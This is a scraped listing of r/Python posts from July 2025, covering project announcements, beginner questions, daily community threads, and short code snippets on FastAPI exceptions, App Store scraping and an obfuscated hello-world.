1m9o70r,The Only Python Cheat Sheet You Will Ever Need,pspathis,0,8,2025-07-26 08:27:57,https://www.reddit.com/r/Python/comments/1m9o70r/the_only_python_cheat_sheet_you_will_ever_need/,"I created a concise and practical cheat sheet, covering over 95% of all Python 3.x commands with examples. Designed for both Python developers, learners, and hobbyists. It provides quick answers and efficient learning without overwhelming you with details. This cheat sheet summarizes key Python syntax, concepts, and common functions in a compact PDF format.

# üìö Topics Covered

* üß† Data Types & Data Type Conversions
* üî§ Booleans & Strings
* ‚ûó Operator Precedence
* üñ®Ô∏è Print Functions & üßë‚Äçüíª User Input
* üîÑ Decision Structure
* üîÅ Repetition Structures
* ‚ö†Ô∏è¬†Exceptions
* üìÅ Files & Strings
* üß∞ Functions & Modules
* üßµ List, Dict, Set, Tuple

üöÄ Download the Cheat Sheet

[https://github.com/prspth/python-cheat-sheet](https://github.com/prspth/python-cheat-sheet)"
1m9o5x2,Finally built a proper landing page for reaktiv - my Signals State Management library,loyoan,15,1,2025-07-26 08:25:50,https://www.reddit.com/r/Python/comments/1m9o5x2/finally_built_a_proper_landing_page_for_reaktiv/,"I've been working on `reaktiv` (a reactive programming library for Python inspired by SolidJS and Angular Signals) for a while, and finally got around to creating a proper landing page for it.

My article [The Missing Manual for Signals ](https://bui.app/the-missing-manual-for-signals-state-management-for-python-developers/)gained good traction on HackerNews and PyCoder's Weekly, but I realized readers needed a way to actually try out Signals while reading about them.

The real highlight is the interactive playground section where you can experiment with Signals, Computed, and Effect directly in your browser using PyScript. No installation, no local setup - just open it up and start exploring reactive patterns in Python!

Links:

* Interactive playground: [https://reaktiv.bui.app](https://reaktiv.bui.app)
* GitHub: [https://github.com/buiapp/reaktiv](https://github.com/buiapp/reaktiv)
* Deep dive article: [https://bui.app/the-missing-manual-for-signals-state-management-for-python-developers/](https://bui.app/the-missing-manual-for-signals-state-management-for-python-developers/)"
1m9m8vd,"Created a small python error improvement module, feedback requested.",Thin-Shallot8491,0,4,2025-07-26 06:23:26,https://www.reddit.com/r/Python/comments/1m9m8vd/created_a_small_python_error_improvement_module/,"This is a small and helpful python module to improve error messages, making them more friendly.

It is different from other ones that just improve logs, this gives tips

It is just a small project, feedback would be amazing.

Github repo:¬†[github.com/progmem-cc/nice-errors](http://github.com/progmem-cc/nice-errors)

Feel free to give your opinion and even better make and issue or pull request. Contribution is  
greatly welcome. :)"
1m9l2ht,Auto Port Detection and Zero Setup: How InstaTunnel Simplifies Dev Workflows,JadeLuxe,0,2,2025-07-26 05:13:55,https://www.reddit.com/r/Python/comments/1m9l2ht/auto_port_detection_and_zero_setup_how/,[https://instatunnel.my/blog/auto-port-detection-and-zero-setup-how-instatunnel-simplifies-dev-workflows#auto-port-detection-explained](https://instatunnel.my/blog/auto-port-detection-and-zero-setup-how-instatunnel-simplifies-dev-workflows#auto-port-detection-explained)
1m9jm14,Local and lightweight Git + a/b testing for prompts,papersashimi,0,0,2025-07-26 03:53:19,https://www.reddit.com/r/Python/comments/1m9jm14/local_and_lightweight_git_ab_testing_for_prompts/,"Recently in my job i was kinda tasked to do some LLM stuff for the company. My background is mostly swe and computer vision. So they threw me this task and told me to use excel as part of my workflow to do some quality testing of prompts. why excel? because some prompts are sensitive so they wanna keep it local. working with prompts and excel was really frustrating. over the last few weeks i was creating sort of this tool for myself. you can think of it like git + ab but for your prompts. 

# Target audience

Anyone dealing with llms

* **Its Local.** Everything happens locally. Running`promptvc init` creates a `.promptvc` directory in your project. Theres no signing into a service etc. Your prompts and whatever is stored in YAML files 
* **Git like Workflow**: You `add` and `commit` prompts right from your terminal with messages, just like you would with Git. I mean most of us already use git so ... 
* **No Platform Lock-in**: Because its just local files, you're not tied to a service. You can inspect the history and write your own scripts against it using the Python API.
* **Focused on the Core Task**: The tool is lightweight. Its purpose is to bring version control and ab testing to you single-turn prompts. **its not for live, interactive testing. at least not yet..** I may include like agentic stuff in the future when i have more time. 

The tool will run both prompts against your sample data, call the LLM (currently openai and anthropic), and show you comparison of the outputs. Please read the \`readme.md\` in the repo for more idea. There's also a \`tutorial.md\` that you can follow along.. Please also star the repo if you found it useful. And i'm happy to get any feedback as to how you will improve this or any features whatsoever. 

  
Link to github here: [https://github.com/duriantaco/promptvc](https://github.com/duriantaco/promptvc)"
1m9jamt,üóî bittty - a pure-python terminal emulator,david-song,33,3,2025-07-26 03:36:11,https://www.reddit.com/r/Python/comments/1m9jamt/bittty_a_purepython_terminal_emulator/,"## üì∫ TL;DR?

Here's a video:

* [üì∫ youtube](https://www.youtube.com/watch?v=BIToEBqJcxU)

## üó£Ô∏è The blurb

If you've ever tried to do anything with the output of TUIs, you'll have bumped into the problems I have: to know what the screen looks like, you need to do 40 years of standards archeology.

This means we can't easily:
* Have apps running inside other apps
* Run apps in Textual
* Quantize or screencap asciinema recordings

...and that dealing with ANSI text is, in general, a conveyor belt of kicks in the groin.

## üßô What My Project Does

`bittty` (bitplane-tty) is a terminal emulator engine written in pure Python, intended to be a modern replacement for `pyte`.

It's not the fastest or the most complete, but it's a decent all-rounder and works with most of the things that work in tmux. This is partly because it was designed by passing the source code of tmux into Gemini, and getting it to write a test suite for everything that tmux supports, and I bashed away at it until ~200 tests passed.

As a bonus, `bittty` is complimented by `textual-tty`, which provides a Textual widget for (almost) all your embedding needs.

## üéØ Target Audience

Nerds who live on the command line. Nerds like me, and hopefully you too.

## ‚úÖ Comparison

* The closest competition is `pyte`, which does not support colours.
* You could use `screen` to embed your content - but that's even worse.
* `tmux` running in a subprocess with `capture-pane` performs far better, but you need the binaries for the platform you're running on; good luck getting that running in Brython or pypy or on your phone or TV.

## üèóÔ∏è Support

### üèÜ working

* Mouse + keyboard input
  * has text mode mouse cursor for asciinema recordings
* PTY with process management
  * (Works in Windows too)
* All the colour modes
* Soft-wrapping for lines
* Alt buffer + switching
* Scroll regions
* Bell
* Window titles
* Diffable, cacheable outputs

### üí£ broken / todo

* Scrollback buffer (infinite scroll with wrapping - work in progress)
* Some colour bleed + cell background issues (far trickier than you'd imagine)
* Slow parsing of inputs (tested solution, need to implement)
* xterm theme support (work in progress)
* some programs refuse to pass UTF-8 to it ü§∑

## üè• Open Sores

It's licensed under the WTFPL with a warranty clause, so you can use it for whatever you like.

* [üóî bittty](https://github.com/bitplane/bittty)
* [ü™ü tittty](https://github.com/bitplane/textual-tty)
* [üè† home](https://bitplane.net/dev/python/bittty)
* [üìñ docs](https://bitplane.net/dev/python/bittty/pydoc)"
1m9h3tt,I need some ideas,Character_Buddy1367,0,7,2025-07-26 01:42:27,https://www.reddit.com/r/Python/comments/1m9h3tt/i_need_some_ideas/,"I have started coding in Python again after months. I have just started recently, and I just came here to ask if y'all have any project ideas?"
1m9gyqv,Scraping Apple App Store Data with Node.js + Cheerio (without getting blocked),PINKINKPEN100,4,3,2025-07-26 01:35:19,https://www.reddit.com/r/Python/comments/1m9gyqv/scraping_apple_app_store_data_with_nodejs_cheerio/,"Hey all! I recently went down the rabbit hole of extracting data from the Apple App Store... not for spamming or anything shady, just to analyze how apps are described, what users are saying, and how competitors position themselves.

Turns out scraping App Store pages isn't super straightforward, especially when you need to avoid blocks and still get consistent HTML responses. Apple‚Äôs frontend is JS-heavy, and many traditional scraping approaches fail silently or get rate-limited fast.

So I used a mix of Node.js and [Cheerio](https://cheerio.js.org/) for parsing, and a web crawling API to handle the request layer. (Specifically I used Crawlbase, which includes IP rotation, geolocation, etc.... but you can substitute with your preferred tool as long as it handles JS-heavy pages.)

My approach involved:

* Making the initial request using a proxy-aware Crawling API
* Extracting raw HTML, then parsing it with Cheerio
* Locating app details like title, seller, category, price, and star ratings
* Grabbing user reviews and associated metadata
* Parsing sections like ‚ÄúMore by this developer‚Äù and ‚ÄúYou might also like‚Äù

If anyone's curious, here‚Äôs a basic snippet of how I did the request part:

    import { CrawlingAPI } from 'crawlbase';
    
    const CRAWLBASE_TOKEN = '<YOUR_TOKEN>';
    const URL = 'https://apps.apple.com/us/app/google-authenticator/id388497605';
    
    async function fetchHTML() {
      const api = new CrawlingAPI({ token: CRAWLBASE_TOKEN });
    
      const response = await api.get(URL, {
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
      });
    
      if (response.statusCode !== 200) {
        throw new Error(`Request failed: ${response.statusCode}`);
      }
    
      return response.body;
    }

From there, I used selectors like `.app-header__title`, `.we-customer-review__title`, etc., to pull the structured data. Once parsed, it‚Äôs easy to convert into a JSON object for analysis or tracking.

‚òù **Important**: Make sure your usage complies with Apple‚Äôs Terms of Service. Steer clear of excessive scraping and any activity that violates their usage restrictions.

I found this super helpful for market research and product monitoring. If you're working on something similar, check out the [full tutorial here](https://crawlbase.com/blog/how-to-crawl-apple-app-store-data/?utm_source=Reddit_Feb&utm_campaign=Reddit_Feb) for the complete walkthrough and code.

Would love to hear if others have tackled App Store scraping in different ways  or hit similar blockers. Cheers! üêç"
1m9ezt4,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,3,0,2025-07-26 00:00:32,https://www.reddit.com/r/Python/comments/1m9ezt4/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1m9dc8q,Estoy empezando que consejos me dan para el camino? üôåüèº,PositiveAd2875,0,4,2025-07-25 22:47:11,https://www.reddit.com/r/Python/comments/1m9dc8q/estoy_empezando_que_consejos_me_dan_para_el_camino/,"Hello, how are you? I just started learning Python and I'm very excited! I wanted to know if you can give me tips on what I should keep in mind as a beginner‚Ä¶

Also, when something overwhelmed you in the code or you thought it was too much for you, how did you solve it? How did you motivate yourself to continue? What was your experience like from when you started until you mastered it?

Blessings, family, every tip is super welcome and I'll be grateful! üôåüèº"
1m9cc2s,Thinking of making a game in Python | JOIN DISCORD FOR MORE,addictibruh,0,3,2025-07-25 22:04:17,https://www.reddit.com/r/Python/comments/1m9cc2s/thinking_of_making_a_game_in_python_join_discord/,"A few tutorials there, some rage here, some debugging way over in the distance... And I think I might just be ready to start making a game in Python.

As it's my first coded game ever, it's not gonna be anything close to a GTA-level game, but we all gotta start somewhere right?

Anyway, main point is that I'm looking for a tiny dev team, anywhere from 5-15 people.

Join the discord for more info:

[https://discord.gg/uDxWHZkHMt](https://discord.gg/uDxWHZkHMt)"
1m9abys,Is Tortoise ORM production-ready?,Life-Abroad-91,22,27,2025-07-25 20:42:27,https://www.reddit.com/r/Python/comments/1m9abys/is_tortoise_orm_productionready/,"I'm considering using Tortoise ORM for my project instead of SQLAlchemy because it's very hard to test -especially when performing async operations on the database. Tortoise ORM also offers native support for FastAPI.

Has anyone used Tortoise ORM in production? Share your experience please."
1m9808e,Seniority level,soacm,25,20,2025-07-25 19:09:33,https://www.reddit.com/r/Python/comments/1m9808e/seniority_level/,"To any senior web developers out there:

What should I focus on to be considered a mid- to senior-level developer?

I'm a Python developer primarily working with Django and Flask. I've interviewed with a few small companies, and they asked only general knowledge questions of the stack and gave a take-home assessment.

What should I practice or improve on to confidently reach at least a mid-level role? Thank you.

  
EDIT: what about tools like Docker or CI/CD pipelines etc., how much importance do they have? Please provide a clear path if possible."
1m97gzz,File configuration question,DijiornoGiovanna,0,1,2025-07-25 18:48:57,https://www.reddit.com/r/Python/comments/1m97gzz/file_configuration_question/,"First off I'm very new to python and I thought of this implementation. This question in particular is in regards to the qtile configuration file.

I figured if I created a master file with ""try except"" in the same directory as a main file and backup file  my ""master file"" would try the main and then uses my working backup if it fails so I don't end up on default qtile if I mess up. (I chmoded my master too btw.)

I figured before I dove too deep on this I would ask if anyone does something similar and what your syntax looks like, or is there something simpler that people use.  Also I figure that qtile has something similar in a different file that I could edit in it's place since it calls the default layout.

Sorry if this is the wrong place but does anyone have input?





"
1m96z4e,"""Edit chart"" button in plotly chart studio graphs",Optimal_Speed_361,1,2,2025-07-25 18:29:26,https://www.reddit.com/r/Python/comments/1m96z4e/edit_chart_button_in_plotly_chart_studio_graphs/,"hey! 

i'm new to plotly, just recently created a chart and hosted it on chart studio then embedded it in a website using the html script . however, there's an ""edit chart"" button that appears right under it. Any way to remove that? If not, do the changes that someone makes using that button affect the plot on the website? I'm wondering because right now, any change that I make to the plot are automatically pushed on the website, which I love. 

Thanks a lot!"
1m96wmi,Stop trying to catch exceptions when its ok to let your program crash,avsaccount,687,160,2025-07-25 18:26:44,https://www.reddit.com/r/Python/comments/1m96wmi/stop_trying_to_catch_exceptions_when_its_ok_to/,"Just found this garbage in our prod code

        except Exception as e:
            logger.error(json.dumps({""reason"":""something unexpected happened"", ""exception"":str(e)}))
            return False

This is in an aws lambda that runs as the authorizer in api gateway. Simply letting the lambda crash would be an automatic rejection, which is the desired behavior.

But now the error is obfuscated and I have to modify and rebuild to include more information so I can actually figure out what is going on. And for what? What benefit does catching this exception give? Nothing. Just logging an error that something unexpected happened. Wow great.

and also now I dont get to glance at lambda failures to see if issues are occurring. Now I have to add more assert statements to make sure that a test success is an actual success. Cringe.

stop doing this. let your program crash"
1m96c36,Do you document your HTTPExceptions in FastAPI ? If yes how ?,__secondary__,19,11,2025-07-25 18:04:22,https://www.reddit.com/r/Python/comments/1m96c36/do_you_document_your_httpexceptions_in_fastapi_if/,"Hello, I am currently working on a personal [project ](https://github.com/Athroniaeth/fastapi-docs-exception)to create a small library that replicates my method of adding my HTTPExceptions to the Swagger and Redoc documentation. My method simply consists of creating classes representing my possible exceptions and having a helper function to obtain the OpenAPI dictionary.

This is how I enable other developers using my API to learn about possible errors on my routes by consulting the documentation. I was wondering if this approach is common or if there is a better way to document HTTP exceptions and thus improve my library or my approach?

Example of my method :

    from fastapi import FastAPI, HTTPException
    from fastapi_docs_exception import HTTPExceptionResponseFactory
    
    
    # Define your exceptions any way you like
    class ApiNotFoundException(HTTPException):
        """"""Custom exception for API not found errors in FastAPI.""""""
    
        def __init__(self, detail: str = ""API key not found or invalid""):
            super().__init__(status_code=404, detail=detail)
    
    
    class NotFoundError(HTTPException):
        """"""Custom exception for not found errors in FastAPI.""""""
    
        def __init__(self, detail: str = ""Resource not found in the storage""):
            super().__init__(status_code=404, detail=detail)
    
    
    class InternalServerError(HTTPException):
        """"""Custom exception for internal server errors in FastAPI.""""""
    
        def __init__(self, detail: str = ""Internal server error, please try again later""):
            super().__init__(status_code=400, detail=detail)
    
    
    # Feed them to the factory
    exc_response_factory = HTTPExceptionResponseFactory()
    
    app = FastAPI(
        responses=exc_response_factory.build([
            NotFoundError(),  # 404 response
            ApiNotFoundException(),  # 404 response (grouped with the previous one)
            InternalServerError(),  # 400 response (only one)
        ]),
    )
    
    
    # Use your exceptions in the code
    @app.get(""/items/{item_id}"")
    def get_item(item_id: str):
        if item_id != ""42"":
            raise NotFoundError()
        return {""item_id"": item_id}"
1m95n3w,MassGen ‚Äì an open-source multi-agent scaling and orchestration framework,LifeUnderstanding732,0,0,2025-07-25 17:38:00,https://www.reddit.com/r/Python/comments/1m95n3w/massgen_an_opensource_multiagent_scaling_and/,"MassGen ‚Äî an open-source multi-agent orchestration framework just launched. Supports cross-model collaboration (Grok, OpenAI, Claude, Gemini) with real-time streaming and consensus-building among agents. Inspired by ""parallel study groups"" and Grok Heavy.¬†

[https://x.com/Chi\_Wang\_/status/1948790995694617036](https://x.com/Chi_Wang_/status/1948790995694617036)"
1m910ha,"Hello, I have just started my Python journey",Fit_Lingonberry_4965,19,37,2025-07-25 14:42:57,https://www.reddit.com/r/Python/comments/1m910ha/hello_i_have_just_started_my_python_journey/,"I have just started Python this week, everything is going good and fine. Yesterday I came across a Youtube video, which said that Python coding should be done in a Group(small or medium) as it will make it easier and interesting with friends. So, I'm searching for similar people to join me in my discord server, currently I'm all alone.

My Discord Username: polo069884

Would be happy if anyone likes to join, thank you for reading."
1m8z7yq,PyOhio Conference this Weekend,BradChesney79,12,3,2025-07-25 13:30:10,https://www.reddit.com/r/Python/comments/1m8z7yq/pyohio_conference_this_weekend/,"Today is the first day of PyOhio located ""here""ish in sunny Downtown Cleveland at the well-known Cleveland State University.

https://www.pyohio.org/2025/program/schedule/

Worth attending if anything on the schedule seems interesting. ...They do publish all the talks, so going in-person isn't even necessary.

Registering as a free attendee does help them secure sponsorships. It is a concrete count of value regarding vendors and other entities with marketing budgets and for similar discretionary spending."
1m8xaqz,$200 to ‚ÄúBuild Machine Learning Systems Using Python‚Äù? What Are They Really Teaching?,_priya_singh,0,12,2025-07-25 12:02:13,https://www.reddit.com/r/Python/comments/1m8xaqz/200_to_build_machine_learning_systems_using/,"I recently saw a [course](https://www.ucertify.com/p/building-machine-learning-systems-using-python.html) priced around $200. The marketing says you‚Äôll ‚Äúbuild smart systems‚Äù and set the ‚Äúfoundation for a promising career.‚Äù But honestly‚Ä¶ what are they teaching that isn‚Äôt already available for free?

Let‚Äôs be real, there are entire [free ML playlists on YouTube](https://youtu.be/29ZQ3TDGgRQ?feature=shared), not to mention MIT, Stanford, and Google AI courses available at zero cost. Platforms like Kaggle offer hands-on datasets and projects for learning by doing. And if it‚Äôs about Python, you can find thousands of notebooks on GitHub and tutorials on Medium or Towards Data Science.

So why is a course like this charging so much? 

Has anyone actually taken one of these paid ML courses?   
Genuinely curious, did you walk away with real-world skills, or was it just a polished version of what‚Äôs already out there for free?"
1m8tdi1,Saw All Those Idle PCs‚ÄîSo I Made a Tool to Use Them,ananto_azizul,97,26,2025-07-25 08:03:37,https://www.reddit.com/r/Python/comments/1m8tdi1/saw_all_those_idle_pcsso_i_made_a_tool_to_use_them/,"Saw a pattern at large companies: most laptops and desktops are just sitting there, barely using their processing power. Devs aren‚Äôt always running heavy stuff, and a lot of machines are just idle for hours.

**What My Project Does:**  
So, I started this project‚ÄîOlosh. The idea is simple: use those free PCs to run Docker images remotely. It lets you send and run Docker containers on other machines in your network, making use of otherwise idle hardware. Right now, it‚Äôs just the basics and I‚Äôm testing with my local PCs.

**Target Audience:**  
This is just a fun experiment and a toy project for now‚Äînot meant for production. It‚Äôs for anyone curious about distributed computing, or who wants to tinker with using spare machines for lightweight jobs.

**Comparison:**  
There are bigger, more robust solutions out there (like Kubernetes, Nomad, etc.), but Olosh is intentionally minimal and easy to set up. It‚Äôs just for simple use cases and learning, not for managing clusters at scale.

This is just a fun experiment to see what‚Äôs possible with all that unused hardware. Feel free to suggest and play with it.

[https://github.com/Ananto30/olosh](vscode-file://vscode-app/usr/share/code/resources/app/out/vs/code/electron-browser/workbench/workbench.html)"
1m8pbus,Pytest.nvim - Neovim plugin to run pytest inside a Docker container (or outside of it),RichardHapb,10,0,2025-07-25 04:01:45,https://www.reddit.com/r/Python/comments/1m8pbus/pytestnvim_neovim_plugin_to_run_pytest_inside_a/,"Some time ago, I built a plugin that was very useful for my daily development in Django (at my job). I believe this plugin can be helpful for others!

[https://github.com/richardhapb/pytest.nvim](https://github.com/richardhapb/pytest.nvim)"
1m8kf09,Friday Daily Thread: r/Python Meta and Free-Talk Fridays,AutoModerator,2,0,2025-07-25 00:00:48,https://www.reddit.com/r/Python/comments/1m8kf09/friday_daily_thread_rpython_meta_and_freetalk/,"# Weekly Thread: Meta Discussions and Free Talk Friday üéôÔ∏è

Welcome to Free Talk Friday on /r/Python! This is the place to discuss the r/Python community (meta discussions), Python news, projects, or anything else Python-related!

## How it Works:

1. **Open Mic**: Share your thoughts, questions, or anything you'd like related to Python or the community.
2. **Community Pulse**: Discuss what you feel is working well or what could be improved in the /r/python community.
3. **News & Updates**: Keep up-to-date with the latest in Python and share any news you find interesting.

## Guidelines:

* All topics should be related to Python or the /r/python community.
* Be respectful and follow Reddit's [Code of Conduct](https://www.redditinc.com/policies/content-policy).

## Example Topics:

1. **New Python Release**: What do you think about the new features in Python 3.11?
2. **Community Events**: Any Python meetups or webinars coming up?
3. **Learning Resources**: Found a great Python tutorial? Share it here!
4. **Job Market**: How has Python impacted your career?
5. **Hot Takes**: Got a controversial Python opinion? Let's hear it!
6. **Community Ideas**: Something you'd like to see us do? tell us.

Let's keep the conversation going. Happy discussing! üåü"
1m8ir4e,"Thoughts on Cinder, performance-oriented version of Python powering Instagram",Living_Run9874,98,12,2025-07-24 22:47:47,https://www.reddit.com/r/Python/comments/1m8ir4e/thoughts_on_cinder_performanceoriented_version_of/,"
Regarding [Cinder](https://github.com/facebookincubator/cinder), one of their reasons for open-sourcing the code, is 
""to facilitate conversation about potentially upstreaming some of this work to CPython and to reduce duplication of effort among people working on CPython performance.""

This seems like an established project, that has been open-sourced for a while.

Why has some of advancement made with this project, not been up-streamed into CPython?

Especially their approach to their JIT-compiler seems super useful."
1m8gqr9,"spamfilter: The super easy, yet highly advanced all-rounder for spam filtering",mags0ft,17,0,2025-07-24 21:23:04,https://www.reddit.com/r/Python/comments/1m8gqr9/spamfilter_the_super_easy_yet_highly_advanced/,"Hey there, Python friends!

I'm the maintainer of [spamfilter](https://github.com/mags0ft/spamfilter), a project I started a few years ago and have been working on ever since. In the recent days and months, I've spent significant time overhauling it - and now I'm happy to present the second iteration of it to you!

It's now quite literally easier than ever to stick together a spam filter that catches an **impressive amount of slop**, which is super valuable for people working on online interactive experiences involving Python (like Flask/Django websites, Discord bots, ...)

My library features:

* the concept of **abstracting more complex spam filters into so-called ""pipelines""** to make your spam filtering rules easily understandable, pythonic and object-oriented
* a big collection of **pre-made spam filters** that allow you to build your own pipelines right away
* some pre-made pipelines for commonly used scenarios like **article websites and online chats**
* an all-new and (humbly said) nice [documentation](https://mags0ft.github.io/spamfilter/) with a lot of details
* **third-party API support** if you want it
* and, because everyone does it, an optional **deep integration** with AI providers and ü§ó Transformer models to detect spam quickly

A quick taste test to show you how the most basic usage would look like:  

```python
from spamfilter.filters import Length, SpecialChars
from spamfilter.pipelines import Pipeline

# create a new pipeline
m = Pipeline([
    # length of 10 to 200 chars, crop if needed
    Length(min_length=10, max_length=200, mode=""crop""),
    # limit use of special characters
    SpecialChars(mode=""normal"")
])

# test a string against it
TEST_STRING = ""This is a test string.""
print(m.check(TEST_STRING).passed)
```

The library itself is, without any add-ons, *only a few kilobytes big* and can drop into almost any project. It doesn't have a steep learning curve at all and is quick to integrate.

The project's target audience are mainly people building programs or websites that handle user-generated content and need a quick and easy-to-use content moderation assistance system. In comparison to other projects, it combines the power of abstracting difficulty behind this monstrosity of a task (people tend to write a lot of nonsense!) away and the latest developments in spam filtering capabilities using modern techniques.

I'd love to hear some feedback about what you think about it and what I can do to improve!"
1m8at15,[linux] sh2mp4 - record videos of arbitrary shell scripts,david-song,3,0,2025-07-24 17:33:46,https://www.reddit.com/r/Python/comments/1m8at15/linux_sh2mp4_record_videos_of_arbitrary_shell/,"## what?

Make video recordings of any old shell script or command, using a hidden X11 desktop, xterm and ffmpeg.

## tl;dr

You'll need some deps:

    sudo apt install xdotool wmctrl ffmpeg xvfb openbox xterm unclutter

Then you can do this:

    uxv sh2mp4 ""ping google.com -c 10"" ping.mp4
    uvx sh2mp4 --cast-file asciinema.cast --speed 8x --font-size=24 cast.mp4

And even get hilariously bad video output to your terminal if you add `--watch` (see video below)

## Example video

With asciinema it resizes to the maximum size in the cast file, which is a ugly. But I'm writing a terminal emulator in pure python and will release that rather than continue down this xterm path :)

* https://youtu.be/Pn3KlvBNBM8?t=189

## docs/src

* https://bitplane.net/dev/python/sh2mp4/
* https://github.com/bitplane/sh2mp4/

### What My Project Does

Exactly what it says in the title

### Target Audience

People who want to record mp4 videos of linux commands

### Comparison

Like asciinema's tools but in python, without cargo or any gifs."
1m8anrk,"bad hello world program (swear world in github link), prints ""hello, world""",Any_Background_5826,0,0,2025-07-24 17:28:22,https://www.reddit.com/r/Python/comments/1m8anrk/bad_hello_world_program_swear_world_in_github/,"the program is:

true=all(\[\])

false=all(\[\[\]\])

zero=+false

one=+true

c=str(str)\[one\]

b=str(eval)\[one\]

u=str(eval)\[one+one\]

i=str(eval)\[one+one+one\]

minus=str(eval)\[one+one+one+one+one+one\]

f=str(eval)\[one+one+one+one+one+one+one+one+one+one\]

u=str(eval)\[one+one+one+one+one+one+one+one+one+one+one\]

n=str(eval)\[one+one+one+one+one+one+one+one+one+one+one+one\]

o=str(eval)\[one+one+one+one+one+one+one+one+one+one+one+one+one+one+one+one\]

full\_stop=str(eval(str(f)+'l'+str(o)+'at')(one))\[one\]

h=str(eval('str'+full\_stop+str(c)+str(o)+str(u)+str(n)+'t'))\[one+one+one+one\]

p=eval(str(c)+str(h)+'r')(eval(str(one)+str(one)+str(one+one)))

eval(str(p)+'r'+str(i)+str(n)+'t')(str(h)+'ell'+str(o)+str(eval(str(c)+str(h)+'r')(eval(str(one+one+one+one)+str(one+one+one+one))))+str(eval(str(c)+str(h)+'r')(eval(str(one+one+one)+str(one+one))))+str(eval(str(c)+str(h)+'r')(eval(str(one)+str(one)+str(one+one+one+one+one+one+one+one+one))))+str(o)+str(eval(str(c)+str(h)+'r')(eval(str(one)+str(one)+str(one+one+one+one))))+str(eval(str(c)+str(h)+'r')(eval(str(one)+str(zero)+str(one+one+one+one+one+one+one+one))))+str(eval(str(c)+str(h)+'r')(eval(str(one)+str(zero)+str(zero)))))

you can use¬†[https://www.programiz.com/python-programming/online-compiler/](https://www.programiz.com/python-programming/online-compiler/)¬†to run it, i don't care if this gets removed,¬†[https://github.com/wanqizhu/pyfuck](https://github.com/wanqizhu/pyfuck)¬†is the link to the website that i used to find out how"
1m860pg,A very modular framework for RAG setup in some lines of code,Labess40,9,1,2025-07-24 14:33:10,https://www.reddit.com/r/Python/comments/1m860pg/a_very_modular_framework_for_rag_setup_in_some/,"Hey everyone,

I've been working on a lightweight Retrieval-Augmented Generation (RAG) framework designed to make it super easy to setup a RAG for newbies.

**Why did I make this?**  
Most RAG frameworks are either too heavy, over-engineered, or locked into cloud providers. I wanted a minimal, open-source alternative you can be flexible.

**Tech stack:**

* Python
* Ollama for local LLM/embedding
* ChromaDB for fast vector storage/retrieval

**What I'd love feedback on:**

* General code structure
* Anything that feels confusing, overcomplicated, or could be made more pythonic

**Repo:**  
üëâ¬†[https://github.com/Bessouat40/RAGLight](https://github.com/Bessouat40/RAGLight)

Feel free to roast the code, nitpick the details, or just let me know if something is unclear! All constructive feedback very welcome, even if it's harsh ‚Äì I really want to improve.

Thanks in advance!"
1m82flz,Flask-Nova ‚Äì A Lightweight Extension to Modernize Flask API Development,treasuremani,17,24,2025-07-24 11:58:42,https://www.reddit.com/r/Python/comments/1m82flz/flasknova_a_lightweight_extension_to_modernize/,"Flask is great, but building APIs often means repeating the same boilerplate ‚Äî decorators, validation, error handling, and docs. I built [Flask-Nova](https://github.com/manitreasure1/flasknova) to solve that.

## What It Does
Flask-Nova is a lightweight Flask extension that simplifies API development with:

- Auto-generated Swagger docs
- Type-safe request models (Pydantic-style)
- Clean decorator-based routing
- Built-in dependency injection (`Depend()`)
- Structured HTTP error/status helpers

## Target Audience
For Flask devs who:
- Build APIs often and want to avoid repetitive setup
- Like Flask‚Äôs flexibility but want better tooling

## Comparison
**Compared to Flask**: Removes boilerplate for routing, validation, and 

## Install
```bash
pip install flask-nova
```
## Links
- GitHub: [https://github.com/manitreasure1/flasknova](https://github.com/manitreasure1/flasknova)  
- PyPI: [https://pypi.org/project/flask-nova/](https://pypi.org/project/flask-nova/)  
- Example App: [https://github.com/manitreasure1/flask-nova-tutorials](https://github.com/manitreasure1/flask-nova-tutorials)
"
1m81n93,Does it have a name? Weird spiral shape I made with the turtle module in Python,TheHater2816,10,13,2025-07-24 11:17:16,https://www.reddit.com/r/Python/comments/1m81n93/does_it_have_a_name_weird_spiral_shape_i_made/,"Hi, I accidentally made this geometric shape in Python and it looked really familiar, so I was wondering if it had a name or something

Thx :-)

Source code:¬†[https://pastebin.com/8T6tKEGK](https://pastebin.com/8T6tKEGK)  
The shape:¬†[https://imgur.com/a/1cmgWYt](https://imgur.com/a/1cmgWYt)"
1m80zeb,Open-source Python library for explicit entropic bias correction in measurement ‚Äì feedback welcome,Fantastic-Tonight652,6,4,2025-07-24 10:40:52,https://www.reddit.com/r/Python/comments/1m80zeb/opensource_python_library_for_explicit_entropic/,"**What My Project Does**  
The¬†[`entropic_measurement`](https://github.com/rconstant1/entropic_measurement)¬†library brings a new approach to quantifying and correcting informational bias (entropy-based) in scientific, industrial and machine learning measurements.  
It provides ready-to-use functions for bias correction based on Shannon and Kullback-Leibler entropies, tracks entropic ‚Äúcost‚Äù for each measurement, and allows exports for transparent audits (CSV/JSON).  
All algorithms are extensible and can be plugged directly into your data pipelines or experiments.

**Target Audience**

* Scientists, engineers, and experimentalists needing rigorous bias correction in measurements
* Data scientists and ML practitioners wanting to audit or correct algorithmic/model bias (Python API)
* Anyone interested in open, reproducible, and information-theoretic approaches to measurement
* The project is production-ready, but also useful for teaching, prototyping and open science

**Comparison with Existing Alternatives**

* Most Python packages (scipy, statsmodels, etc.) focus on traditional statistical error or bias ‚Äî they don‚Äôt address corrections based on informational entropy or KL-divergence.
